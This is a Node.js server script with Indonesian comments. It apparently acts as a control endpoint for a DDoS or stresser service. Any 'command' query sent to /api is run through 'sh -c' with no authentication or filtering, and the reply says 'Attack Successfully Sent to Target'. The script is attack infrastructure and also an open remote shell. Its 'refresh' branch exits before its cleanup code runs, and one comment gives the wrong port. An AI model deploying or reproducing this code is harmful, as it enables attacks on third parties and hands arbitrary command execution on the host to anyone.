const http = require('http');
const url = require('url');
const fs = require('fs');
const { spawn } = require('child_process');

let runningProcesses = [];
let server;

function startServer() {
  server = http.createServer((req, res) => {
    const queryObject = url.parse(req.url, true).query;

    if (req.url.startsWith('/api') && queryObject.command) {
      const commandString = queryObject.command.split('+').join(' ');

      // Memeriksa jika perintah adalah "refresh"
      if (commandString === 'refresh') {
          res.end(JSON.stringify({ message: 'Berhasil me-refresh server' }));
        process.exit()
        // Menghentikan secara paksa semua proses yang sedang berjalan
        runningProcesses.forEach(proc => {
          proc.kill('SIGKILL'); // Mengirim sinyal SIGKILL untuk memaksa penghentian
        });
        runningProcesses = []; // Mengosongkan array proses yang berjalan
        res.writeHead(200, { 'Content-Type': 'application/json' });
        
        return;
      }

      // Menjalankan perintah lain dengan child process
      const child = spawn('sh', ['-c', commandString]);

      // Menambahkan child process ke dalam array runningProcesses
      runningProcesses.push(child);

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ message: `Attack Successfully Sent to Target: ${commandString.split(" ")[2]}` }));

      // Event handler saat child process selesai
      child.on('close', (code) => {
        // Menghapus child process dari array runningProcesses
        runningProcesses = runningProcesses.filter(proc => proc.pid !== child.pid);
      });

      // Event handler jika ada error saat memulai child process
      child.on('error', (err) => {
        console.error(`Gagal memulai proses: ${err.message}`);
      });

    } else {
      // Merespons jika permintaan tidak valid
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Permintaan tidak valid' }));
    }
  });

  // Menjalankan server pada port 3000
  server.listen(4000, () => {
    console.log('Server berjalan di port 4000');
  });
}

startServer(); // Memulai server pertama kali

// File watcher untuk memantau perubahan pada file skrip server
const file = require.resolve(__filename);
fs.watchFile(file, () => {
  server.close(() => {
    console.log('Server ditutup');
    fs.unwatchFile(file); // Menghentikan pemantauan file
    console.log(`Memperbarui ${__filename}`);
    delete require.cache[file]; // Menghapus cache modul dari file
    startServer(); // Memuat ulang server setelah perubahan
  });
});
